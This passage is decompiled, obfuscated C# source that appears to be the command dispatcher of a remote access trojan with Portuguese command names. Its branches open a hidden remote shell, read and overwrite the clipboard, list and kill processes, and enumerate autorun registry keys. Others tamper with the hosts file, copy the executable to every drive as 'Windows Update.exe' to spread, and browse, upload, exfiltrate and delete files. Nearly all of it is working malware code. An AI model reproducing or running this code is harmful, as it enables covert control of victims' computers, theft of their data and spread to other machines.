        NewLateBinding.LateSetComplex(NewLateBinding.LateGet(\u0040Ә.\u0040ӓ, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "WindowStyle", new object[1]
        {
          (object) ProcessWindowStyle.Hidden
        }, (string[]) null, (System.Type[]) null, false, true);
        NewLateBinding.LateSet(\u0040Ә.\u0040ӓ, (System.Type) null, "EnableRaisingEvents", new object[1]
        {
          (object) true
        }, (string[]) null, (System.Type[]) null);
        \u0040Ә.\u0040\u0589("rss");
        NewLateBinding.LateCall(\u0040Ә.\u0040ӓ, (System.Type) null, "Start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(\u0040Ә.\u0040ӓ, (System.Type) null, "BeginErrorReadLine", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(\u0040Ә.\u0040ӓ, (System.Type) null, "BeginOutputReadLine", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      }
      else if (Operators.CompareString(Left2, "rs", false) == 0)
        NewLateBinding.LateCall(NewLateBinding.LateGet(\u0040Ә.\u0040ӓ, (System.Type) null, "StandardInput", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "WriteLine", new object[1]
        {
          (object) \u0040Ә.\u0040Մ(ref strArray1[1])
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      else if (Operators.CompareString(Left2, "rsc", false) == 0)
      {
        try
        {
          NewLateBinding.LateCall(\u0040Ә.\u0040ӓ, (System.Type) null, "Kill", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        \u0040Ә.\u0040ӓ = (object) null;
      }
      else if (Operators.CompareString(Left2, "cc", false) == 0)
        Interaction.Shell("rundll32.exe shell32.dll,Control_RunDLL");
      else if (Operators.CompareString(Left2, "EnviarServidorChamaFormClipboard", false) == 0)
        \u0040Ә.\u0040\u0589("FormClipboard" + \u0040Ә.\u0040Ի + Environment.UserName + "/" + Environment.MachineName + \u0040Ә.\u0040Ի);
      else if (Operators.CompareString(Left2, "MeuTextoClipboard", false) == 0)
        \u0040Ә.\u0040\u0589("TextoClipboard" + \u0040Ә.\u0040Ի + MyProject.Computer.Clipboard.GetText().ToString() + \u0040Ә.\u0040Ի);
      else if (Operators.CompareString(Left2, "NovoClipboard", false) == 0)
        Clipboard.SetText(strArray1[1]);
      else if (Operators.CompareString(Left2, "ExcluirClipboard", false) == 0)
        Clipboard.Clear();
      else if (Operators.CompareString(Left2, "IconsON", false) == 0)
        \u0040Ә.\u0040Ր();
      else if (Operators.CompareString(Left2, "IconsOFF", false) == 0)
        \u0040Ә.\u0040Ր();
      else if (Operators.CompareString(Left2, "Denger", false) == 0)
        \u0040Ә.\u0040\u0589("Denger" + \u0040Ә.\u0040Ի + System.IO.File.ReadAllText(Path.GetTempPath() + "\\output.txt"));
      else if (Operators.CompareString(Left2, "host5", false) == 0)
        \u0040Ә.\u0040\u0589("host5" + \u0040Ә.\u0040Ի + MyProject.Computer.FileSystem.ReadAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts"));
      else if (Operators.CompareString(Left2, "EnviarPermisaoGerenciador", false) == 0)
        \u0040Ә.\u0040\u0589("ChamaFormGerenciadorTareefeas" + \u0040Ә.\u0040Ի + Environment.MachineName + "/" + Environment.UserName + \u0040Ә.\u0040Ի);
      else if (Operators.CompareString(Left2, "form3", false) == 0)
        \u0040Ә.\u0040\u0589("form3");
      else if (Operators.CompareString(Left2, "System", false) == 0)
        Thread.Sleep(Conversions.ToInteger(strArray1[1]));
      else if (Operators.CompareString(Left2, "PegarProcessos", false) == 0)
      {
        string str1 = "";
        string str2 = "ProcessSplit";
        Process[] processes = Process.GetProcesses();
        int index = 0;
        while (index < processes.Length)
        {
          Process process = processes[index];
          try
          {
            str1 = str1 + process.ProcessName + "|" + Conversions.ToString(process.Id) + "|" + process.MainModule.FileName + "|" + Conversions.ToString(process.PrivateMemorySize64) + "|" + Conversions.ToString(process.StartTime) + str2;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            str1 = str1 + process.ProcessName + "|" + Conversions.ToString(process.Id) + "|-|" + Conversions.ToString(process.PrivateMemorySize64) + "|-" + str2;
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
        \u0040Ә.\u0040\u0589("ChamaListProcesss" + \u0040Ә.\u0040Ի + str1 + \u0040Ә.\u0040Ի + Process.GetCurrentProcess().Id.ToString() + \u0040Ә.\u0040Ի);
      }
      else if (Operators.CompareString(Left2, "FinalizarProcesss", false) == 0)
      {
        try
        {
          Process[] processesByName = Process.GetProcessesByName(strArray1[1]);
          int index = 0;
          while (index < processesByName.Length)
          {
            processesByName[index].Kill();
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (Operators.CompareString(Left2, "form12", false) == 0)
        \u0040Ә.\u0040\u0589("form12");
      else if (Operators.CompareString(Left2, "ResumerrProcesss", false) == 0)
      {
        try
        {
          \u0040Ә.\u0040ո(Process.GetProcessById(Conversions.ToInteger(strArray1[1])).Handle);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (Operators.CompareString(Left2, "SuspenderProcesss", false) == 0)
      {
        try
        {
          \u0040Ә.\u0040շ(Process.GetProcessById(Conversions.ToInteger(strArray1[1])).Handle);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (Operators.CompareString(Left2, "RestarttProcesss", false) == 0)
      {
        try
        {
          TextBox textBox = new TextBox();
          textBox.Text = strArray1[1];
          Process.GetProcessById(Conversions.ToInteger(strArray1[2])).Kill();
          Process.Start(textBox.Text);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (Operators.CompareString(Left2, "PermisaoStartUpp", false) == 0)
        \u0040Ә.\u0040\u0589("ChamaFrmStartUpsss" + \u0040Ә.\u0040Ի + Environment.MachineName + "/" + Environment.UserName + \u0040Ә.\u0040Ի);
      else if (Operators.CompareString(Left2, "EnviarStartupsssa", false) == 0)
      {
        Application.DoEvents();
        string Left3;
        try
        {
          string name1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
          string[] valueNames = Registry.CurrentUser.OpenSubKey(name1).GetValueNames();
          int index = 0;
          while (index < valueNames.Length)
          {
            string name2 = valueNames[index];
            Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%CU_RUN%.|." + name2 + ".|."), Registry.CurrentUser.OpenSubKey(name1).GetValue(name2)), (object) ".|."), (object) "\r\n")));
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          string name3 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\";
          string[] valueNames = Registry.CurrentUser.OpenSubKey(name3).GetValueNames();
          int index = 0;
          while (index < valueNames.Length)
          {
            string name4 = valueNames[index];
            Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%CU_ONCE%.|." + name4 + ".|."), Registry.CurrentUser.OpenSubKey(name3).GetValue(name4)), (object) ".|."), (object) "\r\n")));
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          string name5 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\";
          string[] valueNames = Registry.CurrentUser.OpenSubKey(name5).GetValueNames();
          int index = 0;
          while (index < valueNames.Length)
          {
            string name6 = valueNames[index];
            Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%CU_EXPLO%.|." + name6 + ".|."), Registry.CurrentUser.OpenSubKey(name5).GetValue(name6)), (object) ".|."), (object) "\r\n")));
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          string name7 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
          string[] valueNames = Registry.LocalMachine.OpenSubKey(name7).GetValueNames();
          int index = 0;
          while (index < valueNames.Length)
          {
            string name8 = valueNames[index];
            Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%MA_RUN%.|." + name8 + ".|."), Registry.LocalMachine.OpenSubKey(name7).GetValue(name8)), (object) ".|."), (object) "\r\n")));
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          string name9 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\";
          string[] valueNames = Registry.LocalMachine.OpenSubKey(name9).GetValueNames();
          int index = 0;
          while (index < valueNames.Length)
          {
            string name10 = valueNames[index];
            Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%MA_ONCE%.|." + name10 + ".|."), Registry.LocalMachine.OpenSubKey(name9).GetValue(name10)), (object) ".|."), (object) "\r\n")));
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          string name11 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\";
          string[] valueNames = Registry.LocalMachine.OpenSubKey(name11).GetValueNames();
          int index = 0;
          while (index < valueNames.Length)
          {
            string name12 = valueNames[index];
            Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%MA_EXPLO%.|." + name12 + ".|."), Registry.LocalMachine.OpenSubKey(name11).GetValue(name12)), (object) ".|."), (object) "\r\n")));
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
          int index = 0;
          while (index < files.Length)
          {
            string path = files[index];
            Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%FOLD_UP%.|." + Path.GetFileName(path) + ".|."), \u0040Ә.\u0040ե((object) path.Length)), (object) ".|."), (object) "\r\n")));
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        \u0040Ә.\u0040\u0589("EnviarStartupDadoss" + \u0040Ә.\u0040Ի + Left3 + \u0040Ә.\u0040Ի);
      }
      else if (Operators.CompareString(Left2, "ExcluirKeyyy", false) == 0)
      {
        object Instance = (object) \u0040Ә.\u0040է(strArray1[1]);
        object[] objArray4 = new object[2];
        object[] objArray5 = objArray4;
        string[] strArray4 = strArray1;
        string[] strArray5 = strArray4;
        int index3 = 2;
        int index4 = index3;
        string str = strArray5[index4];
        objArray5[0] = (object) str;
        objArray4[1] = (object) false;
        object[] objArray6 = objArray4;
        object[] Arguments = objArray6;
        bool[] flagArray = new bool[2]{ true, false };
        bool[] CopyBack = flagArray;
        NewLateBinding.LateCall(Instance, (System.Type) null, "DeleteValue", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
        if (flagArray[0])
          strArray4[index3] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray6[0]), typeof (string));
      }
      else if (Operators.CompareString(Left2, "ExcluirArquivoStartUp", false) == 0)
      {
        try
        {
          System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + strArray1[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (Operators.CompareString(Left2, "spreading", false) == 0)
      {
        try
        {
          DriveInfo[] drives = DriveInfo.GetDrives();
          int index = 0;
          while (index < drives.Length)
          {
            DriveInfo driveInfo = drives[index];
            Application.DoEvents();
            Thread.Sleep(10);
            if (driveInfo.IsReady)
            {
              if (!\u0040Ә.\u0040Ԧ)
                System.IO.File.Copy(Application.ExecutablePath, driveInfo.RootDirectory.FullName + "Windows Update.exe", true);
              else
                System.IO.File.Copy(Application.ExecutablePath, driveInfo.RootDirectory.FullName + Conversions.ToString(\u0040Ә.\u0040Ԧ), true);
            }
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (Operators.CompareString(Left2, "EnviarServidorChamaFormClipboard", false) == 0)
        \u0040Ә.\u0040\u0589("FormClipboard" + \u0040Ә.\u0040Ի + Environment.UserName + "/" + Environment.MachineName + \u0040Ә.\u0040Ի);
      else if (Operators.CompareString(Left2, "EnviarServidorChamaFormClipboard", false) == 0)
        \u0040Ә.\u0040\u0589("FormClipboard" + \u0040Ә.\u0040Ի + Environment.UserName + "/" + Environment.MachineName + \u0040Ә.\u0040Ի);
      else if (Operators.CompareString(Left2, "MeuTextoClipboard", false) == 0)
        \u0040Ә.\u0040\u0589("TextoClipboard" + \u0040Ә.\u0040Ի + MyProject.Computer.Clipboard.GetText().ToString() + \u0040Ә.\u0040Ի);
      else if (Operators.CompareString(Left2, "NovoClipboard", false) == 0)
        Clipboard.SetText(strArray1[1]);
      else if (Operators.CompareString(Left2, "ExcluirClipboard", false) == 0)
        Clipboard.Clear();
      else if (Operators.CompareString(Left2, "OpenPage", false) == 0)
        Process.Start(strArray1[1]);
      else if (Operators.CompareString(Left2, "BlocKPage", false) == 0)
      {
        MyProject.Computer.FileSystem.WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "\r\n127.0.0.1" + strArray1[1], true);
        MyProject.Computer.FileSystem.WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "\r\n" + \u0040Ә.\u0040ӥ + strArray1[1], true);
      }
      else if (Operators.CompareString(Left2, "Restart", false) != 0)
      {
        if (Operators.CompareString(Left2, "PermisaoGerenciadorMineee", false) == 0)
          \u0040Ә.\u0040\u0589("ChamaFrmGerenciadorr" + \u0040Ә.\u0040Ի + Environment.MachineName + "/" + Environment.UserName + \u0040Ә.\u0040Ի);
        else if (Operators.CompareString(Left2, "|DiscosG|", false) == 0)
        {
          Application.DoEvents();
          string str;
          try
          {
            string Left4;
            str = Conversions.ToString(Operators.AddObject((object) Left4, \u0040Ә.\u0040ձ()));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0040Ә.\u0040\u0589("EnviarResultadoGerenciadorrr" + \u0040Ә.\u0040Ի + str + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "|DesktopG|", false) == 0)
        {
          Application.DoEvents();
          string Left5;
          try
          {
            string Left6;
            Left5 = Conversions.ToString(Operators.AddObject((object) Left6, \u0040Ә.\u0040կ((object) Environment.GetFolderPath(Environment.SpecialFolder.Desktop))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            Left5 = Conversions.ToString(Operators.AddObject((object) Left5, \u0040Ә.\u0040ղ((object) Environment.GetFolderPath(Environment.SpecialFolder.Desktop))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0040Ә.\u0040\u0589("EnviarResultadoGerenciadorrr" + \u0040Ә.\u0040Ի + Left5 + \u0040Ә.\u0040Ի + Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "|ArProgramasG|", false) == 0)
        {
          Application.DoEvents();
          string Left7;
          try
          {
            string Left8;
            Left7 = Conversions.ToString(Operators.AddObject((object) Left8, \u0040Ә.\u0040կ((object) Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            Left7 = Conversions.ToString(Operators.AddObject((object) Left7, \u0040Ә.\u0040ղ((object) Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0040Ә.\u0040\u0589("EnviarResultadoGerenciadorrr" + \u0040Ә.\u0040Ի + Left7 + \u0040Ә.\u0040Ի + Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "|DocumentosG|", false) == 0)
        {
          Application.DoEvents();
          string Left9;
          try
          {
            string Left10;
            Left9 = Conversions.ToString(Operators.AddObject((object) Left10, \u0040Ә.\u0040կ((object) Environment.GetFolderPath(Environment.SpecialFolder.Personal))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            Left9 = Conversions.ToString(Operators.AddObject((object) Left9, \u0040Ә.\u0040ղ((object) Environment.GetFolderPath(Environment.SpecialFolder.Personal))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0040Ә.\u0040\u0589("EnviarResultadoGerenciadorrr" + \u0040Ә.\u0040Ի + Left9 + \u0040Ә.\u0040Ի + Environment.GetFolderPath(Environment.SpecialFolder.Personal) + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "|DownloadsG|", false) == 0)
        {
          Application.DoEvents();
          string Left11;
          try
          {
            string Left12;
            Left11 = Conversions.ToString(Operators.AddObject((object) Left12, \u0040Ә.\u0040կ((object) ("C:\\Users\\" + Environment.UserName + "\\Downloads"))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            Left11 = Conversions.ToString(Operators.AddObject((object) Left11, \u0040Ә.\u0040ղ((object) ("C:\\Users\\" + Environment.UserName + "\\Downloads"))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0040Ә.\u0040\u0589("EnviarResultadoGerenciadorrr" + \u0040Ә.\u0040Ի + Left11 + \u0040Ә.\u0040Ի + "C:\\Users\\" + Environment.UserName + "\\Downloads" + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "|ImagensG|", false) == 0)
        {
          Application.DoEvents();
          string Left13;
          try
          {
            string Left14;
            Left13 = Conversions.ToString(Operators.AddObject((object) Left14, \u0040Ә.\u0040կ((object) Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            Left13 = Conversions.ToString(Operators.AddObject((object) Left13, \u0040Ә.\u0040ղ((object) Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0040Ә.\u0040\u0589("EnviarResultadoGerenciadorrr" + \u0040Ә.\u0040Ի + Left13 + \u0040Ә.\u0040Ի + Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "|MusicasG|", false) == 0)
        {
          Application.DoEvents();
          string Left15;
          try
          {
            string Left16;
            Left15 = Conversions.ToString(Operators.AddObject((object) Left16, \u0040Ә.\u0040կ((object) Environment.GetFolderPath(Environment.SpecialFolder.MyMusic))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            Left15 = Conversions.ToString(Operators.AddObject((object) Left15, \u0040Ә.\u0040ղ((object) Environment.GetFolderPath(Environment.SpecialFolder.MyMusic))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0040Ә.\u0040\u0589("EnviarResultadoGerenciadorrr" + \u0040Ә.\u0040Ի + Left15 + \u0040Ә.\u0040Ի + Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "|VideosG|", false) == 0)
        {
          Application.DoEvents();
          string Left17;
          try
          {
            string Left18;
            Left17 = Conversions.ToString(Operators.AddObject((object) Left18, \u0040Ә.\u0040կ((object) ("C:\\Users\\" + Environment.UserName + "\\Videos"))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            Left17 = Conversions.ToString(Operators.AddObject((object) Left17, \u0040Ә.\u0040ղ((object) ("C:\\Users\\" + Environment.UserName + "\\Videos"))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0040Ә.\u0040\u0589("EnviarResultadoGerenciadorrr" + \u0040Ә.\u0040Ի + Left17 + \u0040Ә.\u0040Ի + "C:\\Users\\" + Environment.UserName + "\\Videos" + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "|AtualizarG|", false) == 0)
        {
          Application.DoEvents();
          string Left19;
          try
          {
            string Left20;
            Left19 = Conversions.ToString(Operators.AddObject((object) Left20, \u0040Ә.\u0040կ((object) strArray1[1])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            Left19 = Conversions.ToString(Operators.AddObject((object) Left19, \u0040Ә.\u0040ղ((object) strArray1[1])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0040Ә.\u0040\u0589("EnviarResultadoGerenciadorrr" + \u0040Ә.\u0040Ի + Left19 + \u0040Ә.\u0040Ի + strArray1[1] + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "|NavegarG|", false) == 0)
        {
          Application.DoEvents();
          string Left21;
          try
          {
            string Left22;
            Left21 = Conversions.ToString(Operators.AddObject((object) Left22, \u0040Ә.\u0040կ((object) strArray1[1])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            Left21 = Conversions.ToString(Operators.AddObject((object) Left21, \u0040Ә.\u0040ղ((object) strArray1[1])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0040Ә.\u0040\u0589("EnviarResultadoGerenciadorrr" + \u0040Ә.\u0040Ի + Left21 + \u0040Ә.\u0040Ի + strArray1[1] + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "|InicializarG|", false) == 0)
        {
          Application.DoEvents();
          string Left23;
          try
          {
            string Left24;
            Left23 = Conversions.ToString(Operators.AddObject((object) Left24, \u0040Ә.\u0040կ((object) Environment.GetFolderPath(Environment.SpecialFolder.Startup))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            Left23 = Conversions.ToString(Operators.AddObject((object) Left23, \u0040Ә.\u0040ղ((object) Environment.GetFolderPath(Environment.SpecialFolder.Startup))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0040Ә.\u0040\u0589("EnviarResultadoGerenciadorrr" + \u0040Ә.\u0040Ի + Left23 + \u0040Ә.\u0040Ի + Environment.GetFolderPath(Environment.SpecialFolder.Startup) + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "|WindowsG|", false) == 0)
        {
          Application.DoEvents();
          string Left25;
          try
          {
            string Left26;
            Left25 = Conversions.ToString(Operators.AddObject((object) Left26, \u0040Ә.\u0040կ((object) "C:\\Windows")));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            Left25 = Conversions.ToString(Operators.AddObject((object) Left25, \u0040Ә.\u0040ղ((object) "C:\\Windows")));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0040Ә.\u0040\u0589("EnviarResultadoGerenciadorrr" + \u0040Ә.\u0040Ի + Left25 + \u0040Ә.\u0040Ի + "C:\\Windows" + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "|SistemaG|", false) == 0)
        {
          Application.DoEvents();
          string Left27;
          try
          {
            string Left28;
            Left27 = Conversions.ToString(Operators.AddObject((object) Left28, \u0040Ә.\u0040կ((object) Environment.GetFolderPath(Environment.SpecialFolder.System))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            Left27 = Conversions.ToString(Operators.AddObject((object) Left27, \u0040Ә.\u0040ղ((object) Environment.GetFolderPath(Environment.SpecialFolder.System))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0040Ә.\u0040\u0589("EnviarResultadoGerenciadorrr" + \u0040Ә.\u0040Ի + Left27 + \u0040Ә.\u0040Ի + Environment.GetFolderPath(Environment.SpecialFolder.System) + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "|VisualizarG|", false) == 0)
        {
          bool flag = true;
          string base64String = Convert.ToBase64String(\u0040Ә.\u0040Տ(System.IO.File.ReadAllBytes(strArray1[1]), ref flag));
          \u0040Ә.\u0040\u0588(ref base64String);
          MemoryStream memoryStream = new MemoryStream();
          string str = "ChamaFrmVisualizar" + \u0040Ә.\u0040Ի;
          memoryStream.Write(\u0040Ә.\u0040\u0588(ref str), 0, str.Length);
          memoryStream.Write(buffer, 0, buffer.Length);
          \u0040Ә.\u0040դ(memoryStream.ToArray());
        }
        else if (Operators.CompareString(Left2, "|RenomearPastaG|", false) == 0)
        {
          try
          {
            MyProject.Computer.FileSystem.RenameDirectory(strArray1[1], strArray1[2]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "|RenomearArquivoG|", false) == 0)
        {
          try
          {
            MyProject.Computer.FileSystem.RenameFile(strArray1[1], strArray1[2]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "|ExcluirPastaG|", false) == 0)
        {
          try
          {
            Directory.Delete(strArray1[1], true);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "|ExcluirArquivoG|", false) == 0)
        {
          try
          {
            System.IO.File.Delete(strArray1[1]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "|BaixarArquivoG|", false) == 0)
        {
          byte[] numArray = System.IO.File.ReadAllBytes(strArray1[1]);
          bool flag = true;
          ref bool local = ref flag;
          string base64String = Convert.ToBase64String(\u0040Ә.\u0040Տ(numArray, ref local));
          \u0040Ә.\u0040\u0588(ref base64String);
          MemoryStream memoryStream = new MemoryStream();
          string str = "EnviarBaixaArquivoG" + \u0040Ә.\u0040Ի + \u0040Ә.\u0040ն() + \u0040Ә.\u0040Ի + Path.GetFileName(strArray1[1]) + \u0040Ә.\u0040Ի + MyProject.Computer.FileSystem.GetFileInfo(strArray1[1]).Length.ToString() + \u0040Ә.\u0040Ի + strArray1[1] + \u0040Ә.\u0040Ի;
          memoryStream.Write(\u0040Ә.\u0040\u0588(ref str), 0, str.Length);
          memoryStream.Write(buffer, 0, buffer.Length);
          \u0040Ә.\u0040դ(memoryStream.ToArray());
        }
        else if (Operators.CompareString(Left2, "|EnviarArquivoMineG|", false) == 0)
        {
          try
          {
            byte[] numArray = Convert.FromBase64String(strArray1[3]);
            bool flag = false;
            ref bool local = ref flag;
            byte[] bytes = \u0040Ә.\u0040Տ(numArray, ref local);
            System.IO.File.WriteAllBytes(strArray1[1] + "\\" + strArray1[2], bytes);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "Permisaoconesaosss", false) == 0)
          \u0040Ә.\u0040\u0589("ChamaFrmConexaoo" + \u0040Ә.\u0040Ի + Environment.MachineName + "/" + Environment.UserName + \u0040Ә.\u0040Ի);
        else if (Operators.CompareString(Left2, "EnviarConxaoooodd", false) == 0)
        {
          try
          {
            string str = string.Empty;
            TcpConnectionInformation[] activeTcpConnections = IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpConnections();
            int index = 0;
            while (index < activeTcpConnections.Length)
            {
              TcpConnectionInformation connectionInformation = activeTcpConnections[index];
              str = str + string.Format("{0}|{1}|{2}", (object) connectionInformation.LocalEndPoint, (object) connectionInformation.RemoteEndPoint, (object) connectionInformation.State) + "\r\n";
              checked { ++index; }
            }
            \u0040Ә.\u0040\u0589("EnviarDadosConexaooo" + \u0040Ә.\u0040Ի + str.Trim() + \u0040Ә.\u0040Ի);
          }
